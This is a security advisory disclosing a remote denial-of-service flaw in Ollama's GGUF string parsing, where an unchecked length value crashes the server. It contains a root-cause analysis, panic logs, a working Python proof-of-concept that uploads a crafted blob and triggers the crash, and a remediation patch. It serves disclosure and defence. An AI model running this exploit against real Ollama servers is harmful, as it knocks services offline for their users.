# Remote Denial of Service in Ollama via GGUF String Length Panic

> **Disclosure Note**
>
> Originally reported via Huntr and publicly disclosed after the disclosure period:
>
> https://huntr.com/bounties/119cfda6-383c-4d57-8d07-6fe308fdc1c2
>
> Re-tested against **Ollama v0.30.11** and observed the same crash behavior. A malformed GGUF file containing an oversized string length value still causes the server to panic and terminate.

---

## Summary

A remote denial-of-service vulnerability exists in Ollama's GGUF parsing logic. The `readGGUFString` function reads an untrusted 64-bit length value from a GGUF file and passes it directly to `make([]byte, length)` without bounds validation.

A maliciously crafted GGUF file containing an extremely large length value (e.g., `2^60`) causes:

```text
panic: runtime error: makeslice: len out of range
```

which immediately terminates the Ollama server process.

An unauthenticated remote attacker can exploit this behavior through the Ollama REST API to crash the service for all users.

---

## Severity

- **CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)
- **Attack Vector:** Network
- **Attack Complexity:** Low
- **Privileges Required:** None
- **User Interaction:** None
- **Availability Impact:** High

---

## Affected Versions

Originally confirmed on Ollama **0.18.1**.

The issue was also reproduced during testing on **Ollama v0.30.11**.

---

## Root Cause

In `fs/ggml/gguf.go`:

```go
func readGGUFString(llm *gguf, r io.Reader) (string, error) {
    // ...
    buf := llm.scratch[:8]
    _, err := io.ReadFull(r, buf)

    // ...
    length := int(llm.ByteOrder.Uint64(buf)) // [1] Read untrusted length

    if length > len(llm.scratch) {
        buf = make([]byte, length)           // [2] Unvalidated allocation
    }

    // ...
}
```

At `[1]`, a 64-bit length is read directly from attacker-controlled GGUF metadata.

At `[2]`, the value is passed directly into:

```go
make([]byte, length)
```

without any upper-bound validation.

When an excessively large value such as `2^60` is supplied, Go attempts to create an impossible allocation and immediately triggers:

```text
panic: runtime error: makeslice: len out of range
```

Because the panic is not recovered, the Ollama server exits entirely.

---

## Remote Attack Flow

1. **Upload Payload:** Attacker uploads a malformed GGUF blob through `POST /api/blobs/:digest`
2. **Trigger Parsing:** Attacker calls `POST /api/create` referencing the malicious blob
3. **Allocation Attempt:** Ollama reads the attacker-controlled length value
4. **Runtime Panic:** `make([]byte, length)` triggers `makeslice: len out of range`
5. **Service Crash:** The Ollama daemon terminates for all users

---

## Server Panic Logs

Captured from a live `ollama serve` instance triggered strictly through remote HTTP requests:

```text
panic: runtime error: makeslice: len out of range

goroutine 147 [running]:
github.com/ollama/ollama/fs/ggml.readGGUFString(...)
        github.com/ollama/ollama/fs/ggml/gguf.go:361

github.com/ollama/ollama/fs/ggml.(*gguf).Decode(...)
        github.com/ollama/ollama/fs/ggml/gguf.go:179

github.com/ollama/ollama/fs/ggml.(*containerGGUF).Decode(...)
        github.com/ollama/ollama/fs/ggml/gguf.go:66

github.com/ollama/ollama/fs/ggml.Decode(...)
        github.com/ollama/ollama/fs/ggml/ggml.go:591

github.com/ollama/ollama/server.ggufLayersWithMediaType(...)
        github.com/ollama/ollama/server/create.go:1226
```

---

## Proof of Concept (PoC)

### Exploit Script

```python
import requests
import hashlib
import struct
import sys

OLLAMA_URL = "http://{ip}:11434"

def generate_malicious_gguf():
    # GGUF Magic, Version (3), Num Tensors (0), Num KV (1)
    header = b"GGUF" + struct.pack("<IQQ", 3, 0, 1)

    # KV Key
    kv_key = struct.pack("<Q", 7) + b"exploit"

    # KV Value Type: String
    val_type = 8

    # Malicious length
    malicious_len = 2**60

    return (
        header
        + kv_key
        + struct.pack("<I", val_type)
        + struct.pack("<Q", malicious_len)
    )

def exploit():
    print(f"[*] Targeting Ollama at {OLLAMA_URL}")

    payload = generate_malicious_gguf()

    digest = (
        "sha256:"
        + hashlib.sha256(payload).hexdigest()
    )

    print(f"[*] Uploading malicious GGUF blob {digest}...")

    requests.post(
        f"{OLLAMA_URL}/api/blobs/{digest}",
        data=payload,
    )

    print("[*] Sending create request...")

    create_payload = {
        "model": "crash-test",
        "files": {
            "model.gguf": digest
        }
    }

    try:
        requests.post(
            f"{OLLAMA_URL}/api/create",
            json=create_payload,
            timeout=2,
        )

        print("[-] Server did not crash.")
    except (
        requests.exceptions.ConnectionError,
        requests.exceptions.ReadTimeout,
    ):
        print("[+] SUCCESS: Ollama server crashed.")

if __name__ == "__main__":
    exploit()
```

---

## Reproduction Steps

1. Configure an Ollama target instance to listen on the network:

```bash
OLLAMA_HOST=0.0.0.0 ollama serve
```

2. Execute the exploit:

```bash
python3 exploit.py
```

3. Observe the crash.

---

## Evidence of Impact

The exploit instantly severs the network connection and crashes the server. The terminal running `ollama serve` on the target machine will output the Go runtime panic and terminate.

> **Screenshot 1: The remote target machine (`172.20.10.9`) running the Ollama server, listening on `0.0.0.0` before the attack.**

<img width="1920" height="1200" alt="565634331-003634fc-e5ac-463c-9320-3affc27d8de1" src="https://github.com/user-attachments/assets/9b45bf60-35de-4278-935f-1d4dc0a2b843" />

---

> **Screenshot 2: The attacker's terminal script configured to target the remote IP with the `2^60` length payload.**

<img width="1920" height="1200" alt="565634594-d6764bf3-c3d3-43b2-b438-e862cf645998" src="https://github.com/user-attachments/assets/0ecca989-08e2-48a4-81c8-45050e5829e4" />

---

> **Screenshot 3: The attacker successfully executes the script. The connection is dropped instantly because the remote server crashed immediately upon receiving the request.**

<img width="1920" height="1200" alt="565634680-56c3e0dc-ca3d-403e-8e57-e5992a116480" src="https://github.com/user-attachments/assets/6cf8acb1-c30f-4499-b030-041622fdabdb" />

---

> **Screenshot 4: The target server panic. The target server processes the POST request and immediately triggers a Go runtime panic at `gguf.go:361`, terminating the process.**

<img width="1920" height="1017" alt="565635052-3847357c-83dd-429e-8ac6-67a783d6ec4d" src="https://github.com/user-attachments/assets/ca05ecf9-97b4-4c95-a5f1-ccfed9a2525d" />

---

## Impact

An attacker can remotely terminate the Ollama service by supplying a malformed GGUF file.

The impact includes:

- Immediate service crash
- Complete loss of availability
- Interruption of all active users
- Forced service restart
- Repeated crash potential through automated requests

Because exploitation occurs through the model import API, a single crafted request can take down the service.

---

## Vulnerable File

| File | Function |
|--------|----------|
| `fs/ggml/gguf.go` | `readGGUFString()` |

---

## Recommended Remediation

```go
func readGGUFString(llm *gguf, r io.Reader) (string, error) {
    // ...
    length := int(llm.ByteOrder.Uint64(buf))

    const maxStringLength = 128 * 1024 * 1024

    if length < 0 || length > maxStringLength {
        return "", fmt.Errorf(
            "invalid or excessive string length: %d",
            length,
        )
    }

    if length > len(llm.scratch) {
        buf = make([]byte, length)
    }

    // ...
}
```

Additional defensive measures:

- Validate all GGUF metadata lengths before allocation
- Recover from parser panics
- Apply resource limits during model imports
- Reject malformed metadata before decoding

---

## Conclusion

The GGUF parser trusts attacker-controlled string length values and directly uses them for memory allocation.

A malformed GGUF file can therefore trigger a runtime panic through a single oversized metadata value, resulting in immediate process termination and complete service unavailability.

Proper bounds validation before allocation eliminates the issue and prevents malformed GGUF metadata from crashing the server.

---

## References

- Huntr Disclosure:
  https://huntr.com/bounties/119cfda6-383c-4d57-8d07-6fe308fdc1c2

- Ollama:
  https://github.com/ollama/ollama

---

## Researcher

**Regaan** — Independent Security Researcher

- GitHub: https://github.com/regaan
- Website: https://rothackers.com
- ORCID: https://orcid.org/0009-0006-3683-7824
